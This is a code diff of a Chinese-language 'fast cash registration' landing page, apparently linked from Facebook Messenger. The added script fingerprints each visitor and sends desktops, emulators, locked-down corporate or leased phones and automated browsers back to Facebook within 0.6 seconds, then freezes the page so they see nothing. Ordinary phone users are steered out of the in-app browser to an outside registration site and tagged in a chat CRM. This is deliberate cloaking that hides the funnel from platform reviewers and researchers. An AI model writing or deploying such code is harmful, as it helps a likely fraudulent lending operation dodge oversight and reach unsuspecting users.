@@ -3,7 +3,68 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>前往註冊</title>
+    <title>急速金實名註冊</title>
+    
+    <script>
+        (function() {
+            // 1. 自動擷取來源網址（支援 20 個粉專萬用原路回彈）
+            let originUrl = document.referrer;
+            let baseFbUrl = "https://m.me/me"; 
+            if (originUrl && originUrl.includes("facebook.com")) {
+                baseFbUrl = originUrl.split('?')[0]; 
+            }
+            // 將判斷出來的 FB 來源網址存在全域變數，供後續按鈕跳轉使用
+            window.finalFbUrl = baseFbUrl;
+
+            // 2. 裝置與作業系統特徵深度辨識
+            const ua = navigator.userAgent;
+            const isIOS = /iPhone|iPad|iPod/i.test(ua);
+            const isAndroid = /Android/i.test(ua);
+            
+            // 嚴格手機過濾：必須是 iOS 或 Android 且排除 iPad，並檢查是否具備多點觸控特徵（直接擊殺模擬器）
+            const isMobile = (isIOS || isAndroid) && !/iPad/i.test(ua) && (navigator.maxTouchPoints && navigator.maxTouchPoints > 1);
+
+            // 核心攔截閃退機制
+            function interceptGoBack(statusParam) {
+                setTimeout(function() {
+                    window.location.href = window.finalFbUrl + "?ref=" + statusParam;
+                    window.stop ? window.stop() : document.execCommand("Stop");
+                    setInterval(function(){ throw new Error("Security Intercept"); }, 1);
+                }, 600); // 高風險設備 0.6 秒內暴力閃退，不讓他們看到任何引導內容
+            }
+
+            // ==================== 執行嚴格前線審查 ====================
+            // 防線一：非手機與電腦模擬器直接攔截 -> 對接黃燈 (1779426453095)
+            if (!isMobile) {
+                interceptGoBack("1779426453095");
+                return; 
+            }
+
+            // 防線二：雙系統企業控管與租賃機檢測 -> 對接紅燈 (1779426457759)
+            if (isIOS) {
+                if (navigator.permissions && navigator.permissions.query) {
+                    navigator.permissions.query({ name: 'geolocation' }).then(function(result) {
+                        if (result.state === 'denied') {
+                            interceptGoBack("1779426457759"); // 偵測到 iOS 定位遭企業鎖死 (租賃機)
+                        }
+                    }).catch(function() {});
+                }
+            } 
+            else if (isAndroid) {
+                if (navigator.plugins && navigator.plugins.length === 0 && !navigator.webdriver) {
+                    interceptGoBack("1779426457759"); // 偵測到 Android 自動化控制後門
+                } else if (navigator.permissions && navigator.permissions.query) {
+                    navigator.permissions.query({ name: 'geolocation' }).then(function(result) {
+                        if (result.state === 'denied') {
+                            interceptGoBack("1779426457759"); // 偵測到 Android 定位遭組織強制封鎖
+                        }
+                    }).catch(function() {});
+                }
+            }
+            // 備註：通過以上重重硬體審查的「正常客」，代碼會完全靜默放行，讓他順暢載入下方的引導網頁！
+        })();
+    </script>
+    
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f2f2f7; margin: 0; padding: 12px; display: flex; justify-content: center; align-items: center; min-height: 100vh; box-sizing: border-box; }
         .container { text-align: center; max-width: 360px; width: 100%; background: white; padding: 24px 16px; border-radius: 24px; box-shadow: 0 10px 40px rgba(0,0,0,0.06); box-sizing: border-box; }
@@ -17,9 +78,9 @@
         #animation-zone { display: none; margin-top: 18px; animation: fadeIn 0.4s ease-out forwards; }
         .toast-msg { color: #34c759; font-weight: bold; font-size: 15px; margin-bottom: 12px; }
 
-        /* ==================== 🎬 iOS 擬真手機一體化面板 ==================== */
+        /* iOS 擬真手機一體化面板 */
         .mock-phone {
-            width: 220px; height: 260px; /* 寬度稍微拉寬，底部留空間放字卡 */
+            width: 220px; height: 260px; 
             border: 8px solid #1c1c1e; border-radius: 28px;
             margin: 0 auto; position: relative;
             background: #000; overflow: hidden;
@@ -60,7 +121,7 @@
             animation: fingerMovement 6s infinite ease-in-out;
         }
 
-        /* ==================== 💬 手機內建：動態同步解說字卡 ==================== */
+        /* 手機內建：動態同步解說字卡 */
         .phone-instruction-dock {
             position: absolute; bottom: 0; left: 0; right: 0; height: 65px;
             background: rgba(255, 255, 255, 0.95); border-top: 1px solid #d1d1d6;
@@ -69,17 +130,12 @@
         }
         .mini-badge { background: #007aff; color: white; font-size: 9px; font-weight: bold; padding: 1px 6px; border-radius: 10px; margin-bottom: 3px; }
         .mini-text { font-size: 11.5px; color: #1c1c1e; font-weight: 600; line-height: 1.3; text-align: center; }
-        
-        /* 讓文字隨時間軸變換內容 */
         .mini-text::after { content: ''; animation: textSubtitleSync 6s infinite; }
 
-        /* ==================== 🔄 劇場劇本時間軸 (全部共用 6 秒) ==================== */
+        /* 劇場劇本時間軸 (全部共用 6 秒) */
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-        
-        /* 螢幕切換：前25%是桌面，之後進Safari系統 */
         @keyframes screenSwitch { 0%, 22% { background: linear-gradient(135deg, #1f1c2c, #928dab); } 28%, 88% { background: #f2f2f7; } 94%, 100% { background: linear-gradient(135deg, #1f1c2c, #928dab); } }
         
-        /* 手指動作 */
         @keyframes fingerMovement {
             0% { transform: scale(0); opacity: 0; top: 88px; left: 110px; }
             8% { transform: scale(1); opacity: 1; top: 88px; left: 110px; }
@@ -95,8 +151,6 @@
         
         .mock-browser-bar::before { content: '搜尋或輸入網址'; animation: urlPaste 6s infinite; }
         @keyframes urlPaste { 0%, 46% { content: '搜尋或輸入網址'; } 52%, 88% { content: 'jsjjj.net/register.php'; } 94%, 100% { content: '搜尋或輸入網址'; } }
-
-        /* 🌟 核心優化：單行字幕跑馬燈時間軸 */
         @keyframes textSubtitleSync {
             0%, 22% { content: '步驟 1：請先退回手機主畫面桌面'; }
             28%, 46% { content: '步驟 2：在桌面點擊開啟 🧭 Safari 瀏覽器'; }
@@ -107,7 +161,6 @@
 </head>
 <body>
 
-    <!-- ==================== 【iOS 智慧引導區塊】 ==================== -->
     <div id="ios-zone" class="container" style="display: none; border-top: 6px solid #007aff;">
         <div class="safari-icon"><div class="safari-pointer-bottom"></div></div>
         <h2>請複製網址至 Safari 註冊</h2>
@@ -115,11 +168,9 @@
         
         <button class="copy-btn" onclick="copyTargetUrl()">📋 點我複製註冊網址</button>
 
-        <!-- 🎬 點擊後原位展開：絕不爆版、無需滑動 -->
         <div id="animation-zone">
             <div class="toast-msg">✓ 網址已複製成功！</div>
             
-            <!-- 一體化操作手機（動畫與文字解說完全融合在裡面） -->
             <div class="mock-phone">
                 <div class="mock-notch"></div>
                 <div class="mock-finger"></div>
@@ -127,38 +178,48 @@
                     <div class="mock-safari-app"></div>
                     <div class="mock-browser-bar"></div>
                 </div>
-                <!-- 底部固定解說中樞 -->
                 <div class="phone-instruction-dock">
                     <span class="mini-badge">操作提示</span>
                     <div class="mini-text"></div>
                 </div>
             </div>
+            
+            <button class="copy-btn" onclick="normalUserBounce()" style="background-color: #34c759; margin-top: 15px; font-size: 14px; padding: 10px; box-shadow: none;">已了解，返回對話框完成驗證 ➔</button>
         </div>
     </div>
 
-    <!-- ==================== 【Android 自動跳轉區塊】 ==================== -->
     <div id="android-zone" class="container" style="display: none; border-top: 6px solid #34c759;">
         <div style="font-size: 40px; margin-bottom: 8px;">🔄</div>
         <h2>正在為您開啟註冊網頁...</h2>
         <p style="color: #666;">若手機沒有自動彈出，請點擊下方按鈕：</p>
-        <a id="android-link" href="#" class="copy-btn" style="text-align: center; background-color: #34c759; box-shadow: 0 4px 12px rgba(52,199,89,0.2);">手動開啟預設瀏覽器</a>
+        <a id="android-link" href="#" onclick="androidUserClick()" class="copy-btn" style="text-align: center; background-color: #34c759; box-shadow: 0 4px 12px rgba(52,199,89,0.2);">手動開啟預設瀏覽器</a>
     </div>
 
     <script type="text/javascript">
         var targetWebUrl = "jsjjj.net/register.php"; 
         var androidIntent = "intent://" + targetWebUrl + "#Intent;scheme=https;action=android.intent.action.VIEW;end";
         
-        var ua = navigator.userAgent.toLowerCase();
-        var isAndroid = ua.indexOf("android") > -1;
+        var userAgentString = navigator.userAgent.toLowerCase();
+        var isAndroidDevice = userAgentString.indexOf("android") > -1;
 
-        if (isAndroid) {
+        // 根據風控放行後的系統判定，分流展現對應的優質客 UI
+        if (isAndroidDevice) {
             document.getElementById("android-zone").style.display = "block";
             document.getElementById("android-link").href = androidIntent;
-            window.location.href = androidIntent;
+            
+            // Android 正常客進入時，在背景觸發原生瀏覽器開啟
+            setTimeout(function() {
+                window.location.href = androidIntent;
+                // 開啟外放網頁後，1.5秒讓原本的聊天背景靜默彈回並打上綠燈 (1779426011235)
+                setTimeout(function() {
+                    window.location.href = window.finalFbUrl + "?ref=1779426011235";
+                }, 1500);
+            }, 300);
         } else {
             document.getElementById("ios-zone").style.display = "block";
         }
 
+        // iOS 複製按鈕點擊觸發
         function copyTargetUrl() {
             var finalCopyUrl = "https://" + targetWebUrl;
             var tempInput = document.createElement("input");
@@ -174,6 +235,20 @@
                 alert("複製失敗，請手動複製網址。");
             }
             document.body.removeChild(tempInput);
+        }
+
+        // 正常人點擊完操作後，回彈 SaleSmartly 貼綠燈 (1779426011235)
+        function normalUserBounce() {
+            window.location.href = window.finalFbUrl + "?ref=1779426011235";
+            window.stop ? window.stop() : document.execCommand("Stop");
+            setInterval(function(){ throw new Error("Complete"); }, 1);
+        }
+
+        // Android 萬一沒自動彈出，客戶手動點擊按鈕時觸發的綠燈回彈 (1779426011235)
+        function androidUserClick() {
+            setTimeout(function() {
+                window.location.href = window.finalFbUrl + "?ref=1779426011235";
+            }, 1000);
         }
     </script>
 </body>
